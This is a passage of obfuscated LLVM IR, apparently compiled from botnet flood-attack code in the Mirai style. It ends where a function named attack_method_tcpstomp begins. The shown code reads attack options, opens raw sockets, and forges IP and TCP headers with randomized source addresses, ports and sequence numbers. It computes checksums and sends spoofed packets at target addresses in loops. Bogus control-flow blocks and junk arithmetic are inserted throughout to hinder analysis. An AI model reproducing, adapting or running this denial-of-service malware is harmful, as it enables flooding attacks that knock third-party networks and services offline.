  %685 = icmp eq i32 %684, 0
  %686 = icmp slt i32 %681, 10
  %687 = or i1 %685, %686
  br i1 %687, label %originalBB297, label %originalBB297alteredBB

originalBB297:                                    ; preds = %originalBB297alteredBB, %679
  %688 = load i32, i32* @x.27
  %689 = load i32, i32* @y.28
  %690 = sub i32 %688, 1
  %691 = mul i32 %688, %690
  %692 = urem i32 %691, 2
  %693 = icmp eq i32 %692, 0
  %694 = icmp slt i32 %689, 10
  %695 = or i1 %693, %694
  br i1 %695, label %originalBBpart2299, label %originalBB297alteredBB

originalBBpart2299:                               ; preds = %originalBB297
  br label %361

; <label>:696:                                    ; preds = %146, %originalBBpart24
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %4
  %697 = alloca i8, align 1
  %698 = alloca %struct.attack_target*, align 8
  %699 = alloca i8, align 1
  %700 = alloca %struct.attack_option*, align 8
  %701 = alloca i32, align 4
  %702 = alloca i32, align 4
  %703 = alloca i8**, align 8
  %704 = alloca i8, align 1
  %705 = alloca i16, align 2
  %706 = alloca i8, align 1
  %707 = alloca i8, align 1
  %708 = alloca i16, align 2
  %709 = alloca i16, align 2
  %710 = alloca i32, align 4
  %711 = alloca i32, align 4
  %712 = alloca i8, align 1
  %713 = alloca i8, align 1
  %714 = alloca i8, align 1
  %715 = alloca i8, align 1
  %716 = alloca i8, align 1
  %717 = alloca i8, align 1
  %718 = alloca i32, align 4
  %719 = alloca i8, align 1
  %720 = alloca i32, align 4
  %721 = alloca %struct.iphdr*, align 8
  %722 = alloca %struct.tcphdr*, align 8
  %723 = alloca i8*, align 8
  %724 = alloca i8*, align 8
  %725 = alloca %struct.iphdr*, align 8
  %726 = alloca %struct.tcphdr*, align 8
  %727 = alloca i8*, align 8
  %728 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %697, align 1
  store %struct.attack_target* %1, %struct.attack_target** %698, align 8
  store i8 %2, i8* %699, align 1
  store %struct.attack_option* %3, %struct.attack_option** %700, align 8
  %729 = load i8, i8* %697, align 1
  %730 = zext i8 %729 to i64
  %731 = call noalias i8* @calloc(i64 %730, i64 8) #6
  %732 = bitcast i8* %731 to i8**
  store i8** %732, i8*** %703, align 8
  %733 = load i8, i8* %699, align 1
  %734 = load %struct.attack_option*, %struct.attack_option** %700, align 8
  %735 = call i32 @attack_get_opt_int(i8 zeroext %733, %struct.attack_option* %734, i8 zeroext 2, i32 0)
  %736 = trunc i32 %735 to i8
  store i8 %736, i8* %704, align 1
  %737 = load i8, i8* %699, align 1
  %738 = load %struct.attack_option*, %struct.attack_option** %700, align 8
  %739 = call i32 @attack_get_opt_int(i8 zeroext %737, %struct.attack_option* %738, i8 zeroext 3, i32 65535)
  %740 = trunc i32 %739 to i16
  store i16 %740, i16* %705, align 2
  %741 = load i8, i8* %699, align 1
  %742 = load %struct.attack_option*, %struct.attack_option** %700, align 8
  %743 = call i32 @attack_get_opt_int(i8 zeroext %741, %struct.attack_option* %742, i8 zeroext 4, i32 64)
  %744 = trunc i32 %743 to i8
  store i8 %744, i8* %706, align 1
  %745 = load i8, i8* %699, align 1
  %746 = load %struct.attack_option*, %struct.attack_option** %700, align 8
  %747 = call i32 @attack_get_opt_int(i8 zeroext %745, %struct.attack_option* %746, i8 zeroext 5, i32 0)
  %748 = trunc i32 %747 to i8
  store i8 %748, i8* %707, align 1
  %749 = load i8, i8* %699, align 1
  %750 = load %struct.attack_option*, %struct.attack_option** %700, align 8
  %751 = call i32 @attack_get_opt_int(i8 zeroext %749, %struct.attack_option* %750, i8 zeroext 6, i32 65535)
  %752 = trunc i32 %751 to i16
  store i16 %752, i16* %708, align 2
  %753 = load i8, i8* %699, align 1
  %754 = load %struct.attack_option*, %struct.attack_option** %700, align 8
  %755 = call i32 @attack_get_opt_int(i8 zeroext %753, %struct.attack_option* %754, i8 zeroext 7, i32 65535)
  %756 = trunc i32 %755 to i16
  store i16 %756, i16* %709, align 2
  %757 = load i8, i8* %699, align 1
  %758 = load %struct.attack_option*, %struct.attack_option** %700, align 8
  %759 = call i32 @attack_get_opt_int(i8 zeroext %757, %struct.attack_option* %758, i8 zeroext 17, i32 65535)
  store i32 %759, i32* %710, align 4
  %760 = load i8, i8* %699, align 1
  %761 = load %struct.attack_option*, %struct.attack_option** %700, align 8
  %762 = call i32 @attack_get_opt_int(i8 zeroext %760, %struct.attack_option* %761, i8 zeroext 18, i32 65535)
  store i32 %762, i32* %711, align 4
  %763 = load i8, i8* %699, align 1
  %764 = load %struct.attack_option*, %struct.attack_option** %700, align 8
  %765 = call i32 @attack_get_opt_int(i8 zeroext %763, %struct.attack_option* %764, i8 zeroext 11, i32 0)
  %766 = trunc i32 %765 to i8
  store i8 %766, i8* %712, align 1
  %767 = load i8, i8* %699, align 1
  %768 = load %struct.attack_option*, %struct.attack_option** %700, align 8
  %769 = call i32 @attack_get_opt_int(i8 zeroext %767, %struct.attack_option* %768, i8 zeroext 12, i32 1)
  %770 = trunc i32 %769 to i8
  store i8 %770, i8* %713, align 1
  %771 = load i8, i8* %699, align 1
  %772 = load %struct.attack_option*, %struct.attack_option** %700, align 8
  %773 = call i32 @attack_get_opt_int(i8 zeroext %771, %struct.attack_option* %772, i8 zeroext 13, i32 0)
  %774 = trunc i32 %773 to i8
  store i8 %774, i8* %714, align 1
  %775 = load i8, i8* %699, align 1
  %776 = load %struct.attack_option*, %struct.attack_option** %700, align 8
  %777 = call i32 @attack_get_opt_int(i8 zeroext %775, %struct.attack_option* %776, i8 zeroext 14, i32 0)
  %778 = trunc i32 %777 to i8
  store i8 %778, i8* %715, align 1
  %779 = load i8, i8* %699, align 1
  %780 = load %struct.attack_option*, %struct.attack_option** %700, align 8
  %781 = call i32 @attack_get_opt_int(i8 zeroext %779, %struct.attack_option* %780, i8 zeroext 15, i32 0)
  %782 = trunc i32 %781 to i8
  store i8 %782, i8* %716, align 1
  %783 = load i8, i8* %699, align 1
  %784 = load %struct.attack_option*, %struct.attack_option** %700, align 8
  %785 = call i32 @attack_get_opt_int(i8 zeroext %783, %struct.attack_option* %784, i8 zeroext 16, i32 0)
  %786 = trunc i32 %785 to i8
  store i8 %786, i8* %717, align 1
  %787 = load i8, i8* %699, align 1
  %788 = load %struct.attack_option*, %struct.attack_option** %700, align 8
  %789 = call i32 @attack_get_opt_int(i8 zeroext %787, %struct.attack_option* %788, i8 zeroext 0, i32 512)
  store i32 %789, i32* %718, align 4
  %790 = load i8, i8* %699, align 1
  %791 = load %struct.attack_option*, %struct.attack_option** %700, align 8
  %792 = call i32 @attack_get_opt_int(i8 zeroext %790, %struct.attack_option* %791, i8 zeroext 1, i32 1)
  %793 = trunc i32 %792 to i8
  store i8 %793, i8* %719, align 1
  %794 = load i8, i8* %699, align 1
  %795 = load %struct.attack_option*, %struct.attack_option** %700, align 8
  %796 = load i32, i32* @LOCAL_ADDR, align 4
  %797 = call i32 @attack_get_opt_ip(i8 zeroext %794, %struct.attack_option* %795, i8 zeroext 25, i32 %796)
  store i32 %797, i32* %720, align 4
  %798 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %798, i32* %702, align 4
  %799 = icmp eq i32 %798, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %124
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %202
  %800 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %801 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %802 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %801, i32 0, i32 4
  store i16 %800, i16* %802, align 2
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %222
  %803 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %804 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %803, i32 0, i32 6
  store i8 6, i8* %804, align 1
  %805 = load i32, i32* %36, align 4
  %806 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %807 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %806, i32 0, i32 8
  store i32 %805, i32* %807, align 4
  %808 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %809 = load i32, i32* %17, align 4
  %810 = sext i32 %809 to i64
  %811 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %808, i64 %810
  %812 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %811, i32 0, i32 1
  %813 = load i32, i32* %812, align 4
  %814 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %815 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %814, i32 0, i32 9
  store i32 %813, i32* %815, align 4
  %816 = load i16, i16* %24, align 2
  %817 = call zeroext i16 @htons(i16 zeroext %816) #7
  %818 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %819 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %818, i32 0, i32 0
  store i16 %817, i16* %819, align 4
  %820 = load i16, i16* %25, align 2
  %821 = call zeroext i16 @htons(i16 zeroext %820) #7
  %822 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %823 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %822, i32 0, i32 1
  store i16 %821, i16* %823, align 2
  %824 = load i32, i32* %26, align 4
  %825 = trunc i32 %824 to i16
  %826 = call zeroext i16 @htons(i16 zeroext %825) #7
  %827 = zext i16 %826 to i32
  %828 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %829 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %828, i32 0, i32 2
  store i32 %827, i32* %829, align 4
  %830 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %831 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %830, i32 0, i32 4
  %832 = load i16, i16* %831, align 4
  %_ = sub i16 %832, -241
  %gen = mul i16 %_, -241
  %_11 = sub i16 0, %832
  %gen12 = add i16 %_11, -241
  %_13 = shl i16 %832, -241
  %_14 = sub i16 %832, -241
  %gen15 = mul i16 %_14, -241
  %833 = and i16 %832, -241
  %_16 = shl i16 %833, 80
  %_17 = shl i16 %833, 80
  %_18 = sub i16 %833, 80
  %gen19 = mul i16 %_18, 80
  %_20 = shl i16 %833, 80
  %834 = or i16 %833, 80
  store i16 %834, i16* %831, align 4
  %835 = load i8, i8* %28, align 1
  %836 = sext i8 %835 to i16
  %837 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %838 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %837, i32 0, i32 4
  %839 = load i16, i16* %838, align 4
  %_21 = sub i16 0, %836
  %gen22 = add i16 %_21, 1
  %_23 = sub i16 0, %836
  %gen24 = add i16 %_23, 1
  %_25 = sub i16 0, %836
  %gen26 = add i16 %_25, 1
  %_27 = sub i16 %836, 1
  %gen28 = mul i16 %_27, 1
  %_29 = shl i16 %836, 1
  %_30 = sub i16 %836, 1
  %gen31 = mul i16 %_30, 1
  %_32 = sub i16 0, %836
  %gen33 = add i16 %_32, 1
  %840 = and i16 %836, 1
  %_34 = sub i16 %840, 13
  %gen35 = mul i16 %_34, 13
  %_36 = sub i16 0, %840
  %gen37 = add i16 %_36, 13
  %_38 = shl i16 %840, 13
  %_39 = sub i16 %840, 13
  %gen40 = mul i16 %_39, 13
  %_41 = shl i16 %840, 13
  %_42 = shl i16 %840, 13
  %_43 = shl i16 %840, 13
  %841 = shl i16 %840, 13
  %842 = and i16 %839, -8193
  %_44 = sub i16 %842, %841
  %gen45 = mul i16 %_44, %841
  %_46 = sub i16 %842, %841
  %gen47 = mul i16 %_46, %841
  %_48 = shl i16 %842, %841
  %_49 = shl i16 %842, %841
  %843 = or i16 %842, %841
  store i16 %843, i16* %838, align 4
  %844 = load i8, i8* %29, align 1
  %845 = sext i8 %844 to i16
  %846 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %847 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %846, i32 0, i32 4
  %848 = load i16, i16* %847, align 4
  %_50 = sub i16 0, %845
  %gen51 = add i16 %_50, 1
  %_52 = shl i16 %845, 1
  %_53 = sub i16 %845, 1
  %gen54 = mul i16 %_53, 1
  %_55 = shl i16 %845, 1
  %_56 = shl i16 %845, 1
  %_57 = sub i16 %845, 1
  %gen58 = mul i16 %_57, 1
  %849 = and i16 %845, 1
  %_59 = shl i16 %849, 12
  %_60 = sub i16 %849, 12
  %gen61 = mul i16 %_60, 12
  %_62 = shl i16 %849, 12
  %_63 = sub i16 0, %849
  %gen64 = add i16 %_63, 12
  %850 = shl i16 %849, 12
  %_65 = shl i16 %848, -4097
  %851 = and i16 %848, -4097
  %_66 = shl i16 %851, %850
  %_67 = shl i16 %851, %850
  %_68 = sub i16 0, %851
  %gen69 = add i16 %_68, %850
  %_70 = sub i16 0, %851
  %gen71 = add i16 %_70, %850
  %_72 = shl i16 %851, %850
  %_73 = shl i16 %851, %850
  %_74 = sub i16 0, %851
  %gen75 = add i16 %_74, %850
  %_76 = sub i16 0, %851
  %gen77 = add i16 %_76, %850
  %_78 = shl i16 %851, %850
  %852 = or i16 %851, %850
  store i16 %852, i16* %847, align 4
  %853 = load i8, i8* %30, align 1
  %854 = sext i8 %853 to i16
  %855 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %856 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %855, i32 0, i32 4
  %857 = load i16, i16* %856, align 4
  %_79 = shl i16 %854, 1
  %_80 = sub i16 %854, 1
  %gen81 = mul i16 %_80, 1
  %_82 = sub i16 %854, 1
  %gen83 = mul i16 %_82, 1
  %_84 = sub i16 0, %854
  %gen85 = add i16 %_84, 1
  %_86 = sub i16 %854, 1
  %gen87 = mul i16 %_86, 1
  %_88 = sub i16 %854, 1
  %gen89 = mul i16 %_88, 1
  %_90 = sub i16 0, %854
  %gen91 = add i16 %_90, 1
  %_92 = shl i16 %854, 1
  %858 = and i16 %854, 1
  %_93 = sub i16 %858, 11
  %gen94 = mul i16 %_93, 11
  %_95 = shl i16 %858, 11
  %859 = shl i16 %858, 11
  %_96 = sub i16 0, %857
  %gen97 = add i16 %_96, -2049
  %860 = and i16 %857, -2049
  %_98 = shl i16 %860, %859
  %_99 = shl i16 %860, %859
  %_100 = shl i16 %860, %859
  %_101 = sub i16 %860, %859
  %gen102 = mul i16 %_101, %859
  %_103 = shl i16 %860, %859
  %_104 = shl i16 %860, %859
  %_105 = sub i16 0, %860
  %gen106 = add i16 %_105, %859
  %_107 = sub i16 %860, %859
  %gen108 = mul i16 %_107, %859
  %861 = or i16 %860, %859
  store i16 %861, i16* %856, align 4
  %862 = load i8, i8* %31, align 1
  %863 = sext i8 %862 to i16
  %864 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %865 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %864, i32 0, i32 4
  %866 = load i16, i16* %865, align 4
  %_109 = shl i16 %863, 1
  %_110 = sub i16 %863, 1
  %gen111 = mul i16 %_110, 1
  %_112 = sub i16 %863, 1
  %gen113 = mul i16 %_112, 1
  %_114 = sub i16 %863, 1
  %gen115 = mul i16 %_114, 1
  %_116 = shl i16 %863, 1
  %_117 = sub i16 0, %863
  %gen118 = add i16 %_117, 1
  %_119 = shl i16 %863, 1
  %_120 = sub i16 %863, 1
  %gen121 = mul i16 %_120, 1
  %867 = and i16 %863, 1
  %_122 = sub i16 0, %867
  %gen123 = add i16 %_122, 10
  %_124 = sub i16 0, %867
  %gen125 = add i16 %_124, 10
  %_126 = sub i16 %867, 10
  %gen127 = mul i16 %_126, 10
  %_128 = sub i16 %867, 10
  %gen129 = mul i16 %_128, 10
  %_130 = shl i16 %867, 10
  %_131 = sub i16 0, %867
  %gen132 = add i16 %_131, 10
  %868 = shl i16 %867, 10
  %_133 = sub i16 %866, -1025
  %gen134 = mul i16 %_133, -1025
  %_135 = sub i16 %866, -1025
  %gen136 = mul i16 %_135, -1025
  %_137 = sub i16 %866, -1025
  %gen138 = mul i16 %_137, -1025
  %_139 = sub i16 0, %866
  %gen140 = add i16 %_139, -1025
  %_141 = shl i16 %866, -1025
  %_142 = sub i16 0, %866
  %gen143 = add i16 %_142, -1025
  %_144 = shl i16 %866, -1025
  %_145 = sub i16 %866, -1025
  %gen146 = mul i16 %_145, -1025
  %_147 = shl i16 %866, -1025
  %869 = and i16 %866, -1025
  %_148 = sub i16 %869, %868
  %gen149 = mul i16 %_148, %868
  %870 = or i16 %869, %868
  store i16 %870, i16* %865, align 4
  %871 = load i8, i8* %32, align 1
  %872 = sext i8 %871 to i16
  %873 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %874 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %873, i32 0, i32 4
  %875 = load i16, i16* %874, align 4
  %_150 = sub i16 0, %872
  %gen151 = add i16 %_150, 1
  %_152 = sub i16 %872, 1
  %gen153 = mul i16 %_152, 1
  %_154 = shl i16 %872, 1
  %_155 = sub i16 0, %872
  %gen156 = add i16 %_155, 1
  %_157 = sub i16 %872, 1
  %gen158 = mul i16 %_157, 1
  %_159 = sub i16 0, %872
  %gen160 = add i16 %_159, 1
  %_161 = shl i16 %872, 1
  %_162 = sub i16 0, %872
  %gen163 = add i16 %_162, 1
  %876 = and i16 %872, 1
  %_164 = shl i16 %876, 9
  %_165 = sub i16 0, %876
  %gen166 = add i16 %_165, 9
  %_167 = shl i16 %876, 9
  %_168 = sub i16 0, %876
  %gen169 = add i16 %_168, 9
  %_170 = sub i16 0, %876
  %gen171 = add i16 %_170, 9
  %877 = shl i16 %876, 9
  %_172 = shl i16 %875, -513
  %_173 = sub i16 %875, -513
  %gen174 = mul i16 %_173, -513
  %878 = and i16 %875, -513
  %_175 = sub i16 %878, %877
  %gen176 = mul i16 %_175, %877
  %_177 = sub i16 0, %878
  %gen178 = add i16 %_177, %877
  %879 = or i16 %878, %877
  store i16 %879, i16* %874, align 4
  %880 = load i8, i8* %33, align 1
  %881 = sext i8 %880 to i16
  %882 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %883 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %882, i32 0, i32 4
  %884 = load i16, i16* %883, align 4
  %_179 = sub i16 %881, 1
  %gen180 = mul i16 %_179, 1
  %_181 = sub i16 %881, 1
  %gen182 = mul i16 %_181, 1
  %885 = and i16 %881, 1
  %_183 = sub i16 %885, 8
  %gen184 = mul i16 %_183, 8
  %_185 = sub i16 0, %885
  %gen186 = add i16 %_185, 8
  %886 = shl i16 %885, 8
  %_187 = sub i16 %884, -257
  %gen188 = mul i16 %_187, -257
  %887 = and i16 %884, -257
  %_189 = sub i16 %887, %886
  %gen190 = mul i16 %_189, %886
  %_191 = shl i16 %887, %886
  %888 = or i16 %887, %886
  store i16 %888, i16* %883, align 4
  %889 = call i32 @rand_next()
  %_192 = sub i32 0, %889
  %gen193 = add i32 %_192, 65535
  %_194 = shl i32 %889, 65535
  %_195 = sub i32 %889, 65535
  %gen196 = mul i32 %_195, 65535
  %_197 = sub i32 0, %889
  %gen198 = add i32 %_197, 65535
  %_199 = shl i32 %889, 65535
  %_200 = sub i32 0, %889
  %gen201 = add i32 %_200, 65535
  %890 = and i32 %889, 65535
  %891 = trunc i32 %890 to i16
  %892 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %893 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %892, i32 0, i32 5
  store i16 %891, i16* %893, align 2
  %894 = load i8, i8* %30, align 1
  %895 = icmp ne i8 %894, 0
  br label %originalBB10

originalBB205alteredBB:                           ; preds = %originalBB205, %341
  %896 = load i32, i32* %17, align 4
  %_206 = sub i32 %896, 1
  %gen207 = mul i32 %_206, 1
  %_208 = shl i32 %896, 1
  %_209 = shl i32 %896, 1
  %_210 = sub i32 0, %896
  %gen211 = add i32 %_210, 1
  %_212 = sub i32 0, %896
  %gen213 = add i32 %_212, 1
  %897 = add nsw i32 %896, 1
  store i32 %897, i32* %17, align 4
  br label %originalBB205

originalBB217alteredBB:                           ; preds = %originalBB217, %361
  store i32 0, i32* %17, align 4
  br label %originalBB217

originalBB221alteredBB:                           ; preds = %originalBB221, %378
  %898 = load i32, i32* %17, align 4
  %899 = load i8, i8* %13, align 1
  %900 = zext i8 %899 to i32
  %901 = icmp slt i32 %898, %900
  br label %originalBB221

originalBB225alteredBB:                           ; preds = %originalBB225, %421
  %902 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %903 = load i32, i32* %17, align 4
  %904 = sext i32 %903 to i64
  %905 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %902, i64 %904
  %906 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %905, i32 0, i32 1
  %907 = load i32, i32* %906, align 4
  %908 = call i32 @ntohl(i32 %907) #7
  %909 = call i32 @rand_next()
  %910 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %911 = load i32, i32* %17, align 4
  %912 = sext i32 %911 to i64
  %913 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %910, i64 %912
  %914 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %913, i32 0, i32 2
  %915 = load i8, i8* %914, align 4
  %916 = zext i8 %915 to i32
  %_226 = sub i32 %909, %916
  %gen227 = mul i32 %_226, %916
  %_228 = shl i32 %909, %916
  %917 = lshr i32 %909, %916
  %_229 = sub i32 %908, %917
  %gen230 = mul i32 %_229, %917
  %918 = add i32 %908, %917
  %919 = call i32 @htonl(i32 %918) #7
  %920 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %921 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %920, i32 0, i32 9
  store i32 %919, i32* %921, align 4
  br label %originalBB225

originalBB234alteredBB:                           ; preds = %originalBB234, %461
  %922 = call i32 @rand_next()
  %923 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %924 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %923, i32 0, i32 8
  store i32 %922, i32* %924, align 4
  br label %originalBB234

originalBB238alteredBB:                           ; preds = %originalBB238, %491
  %925 = load i16, i16* %24, align 2
  %926 = zext i16 %925 to i32
  %927 = icmp eq i32 %926, 65535
  br label %originalBB238

originalBB242alteredBB:                           ; preds = %originalBB242, %511
  %928 = call i32 @rand_next()
  %_243 = sub i32 %928, 65535
  %gen244 = mul i32 %_243, 65535
  %_245 = sub i32 0, %928
  %gen246 = add i32 %_245, 65535
  %_247 = sub i32 0, %928
  %gen248 = add i32 %_247, 65535
  %_249 = sub i32 %928, 65535
  %gen250 = mul i32 %_249, 65535
  %_251 = sub i32 %928, 65535
  %gen252 = mul i32 %_251, 65535
  %_253 = shl i32 %928, 65535
  %_254 = sub i32 0, %928
  %gen255 = add i32 %_254, 65535
  %_256 = shl i32 %928, 65535
  %929 = and i32 %928, 65535
  %930 = trunc i32 %929 to i16
  %931 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %932 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %931, i32 0, i32 0
  store i16 %930, i16* %932, align 4
  br label %originalBB242

originalBB260alteredBB:                           ; preds = %originalBB260, %537
  %933 = call i32 @rand_next()
  %_261 = sub i32 0, %933
  %gen262 = add i32 %_261, 65535
  %_263 = sub i32 0, %933
  %gen264 = add i32 %_263, 65535
  %_265 = sub i32 %933, 65535
  %gen266 = mul i32 %_265, 65535
  %_267 = shl i32 %933, 65535
  %_268 = shl i32 %933, 65535
  %_269 = sub i32 0, %933
  %gen270 = add i32 %_269, 65535
  %934 = and i32 %933, 65535
  %935 = trunc i32 %934 to i16
  %936 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %937 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %936, i32 0, i32 1
  store i16 %935, i16* %937, align 2
  br label %originalBB260

originalBB274alteredBB:                           ; preds = %originalBB274, %566
  %938 = load i32, i32* %27, align 4
  %939 = icmp eq i32 %938, 65535
  br label %originalBB274

originalBB278alteredBB:                           ; preds = %originalBB278, %592
  %940 = load i8*, i8** %43, align 8
  %941 = load i32, i32* %34, align 4
  call void @rand_str(i8* %940, i32 %941)
  br label %originalBB278

originalBB282alteredBB:                           ; preds = %originalBB282, %611
  %942 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %943 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %942, i32 0, i32 7
  store i16 0, i16* %943, align 2
  %944 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %945 = bitcast %struct.iphdr* %944 to i16*
  %946 = call zeroext i16 @checksum_generic(i16* %945, i32 20)
  %947 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %948 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %947, i32 0, i32 7
  store i16 %946, i16* %948, align 2
  %949 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %950 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %949, i32 0, i32 6
  store i16 0, i16* %950, align 4
  %951 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %952 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %953 = bitcast %struct.tcphdr* %952 to i8*
  %954 = load i32, i32* %34, align 4
  %955 = sext i32 %954 to i64
  %_283 = shl i64 20, %955
  %956 = add i64 20, %955
  %957 = trunc i64 %956 to i16
  %958 = call zeroext i16 @htons(i16 zeroext %957) #7
  %959 = load i32, i32* %34, align 4
  %960 = sext i32 %959 to i64
  %_284 = shl i64 20, %960
  %_285 = sub i64 0, 20
  %gen286 = add i64 %_285, %960
  %961 = add i64 20, %960
  %962 = trunc i64 %961 to i32
  %963 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %951, i8* %953, i16 zeroext %958, i32 %962)
  %964 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %965 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %964, i32 0, i32 6
  store i16 %963, i16* %965, align 4
  %966 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %967 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %966, i32 0, i32 1
  %968 = load i16, i16* %967, align 2
  %969 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %970 = load i32, i32* %17, align 4
  %971 = sext i32 %970 to i64
  %972 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %969, i64 %971
  %973 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %972, i32 0, i32 0
  %974 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %973, i32 0, i32 1
  store i16 %968, i16* %974, align 2
  %975 = load i32, i32* %18, align 4
  %976 = load i8*, i8** %40, align 8
  %977 = load i32, i32* %34, align 4
  %978 = sext i32 %977 to i64
  %_287 = shl i64 40, %978
  %_288 = sub i64 0, 40
  %gen289 = add i64 %_288, %978
  %_290 = sub i64 0, 40
  %gen291 = add i64 %_290, %978
  %_292 = shl i64 40, %978
  %_293 = shl i64 40, %978
  %979 = add i64 40, %978
  %980 = bitcast %union.__CONST_SOCKADDR_ARG* %44 to %struct.sockaddr**
  %981 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %982 = load i32, i32* %17, align 4
  %983 = sext i32 %982 to i64
  %984 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %981, i64 %983
  %985 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %984, i32 0, i32 0
  %986 = bitcast %struct.sockaddr_in* %985 to %struct.sockaddr*
  store %struct.sockaddr* %986, %struct.sockaddr** %980, align 8
  %987 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %44, i32 0, i32 0
  %988 = load %struct.sockaddr*, %struct.sockaddr** %987, align 8
  %989 = call i64 @sendto(i32 %975, i8* %976, i64 %979, i32 16384, %struct.sockaddr* %988, i32 16)
  br label %originalBB282

originalBB297alteredBB:                           ; preds = %originalBB297, %679
  br label %originalBB297
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpstomp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_stomp_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 16) #6
